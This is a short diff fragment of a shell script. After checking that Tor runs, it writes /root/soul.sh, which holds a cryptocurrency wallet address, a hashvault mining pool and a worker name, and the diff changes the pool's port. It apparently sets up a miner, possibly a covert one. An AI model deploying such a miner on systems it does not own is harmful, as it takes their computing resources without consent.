@@ -107,7 +107,7 @@ pgrep tor && echo "[✓] Tor is running!" || echo "[✗] Tor failed to start."
 cat << 'EOM' > /root/soul.sh
 #!/bin/bash
 WALLET="49xs4gWaPLWFzkLbmFgBdm9V9ZU2rf7djF7kUVE11seJgyLEt6GekKpTVhugLXD8tq7gHoMtiqBRj7TsVWdKN5m6Kshxpsv"
-POOL="pool.hashvault.pro:443"
+POOL="pool.hashvault.pro:8888"
 WORKER="king3"
 
 echo "[+] Starting setup..."
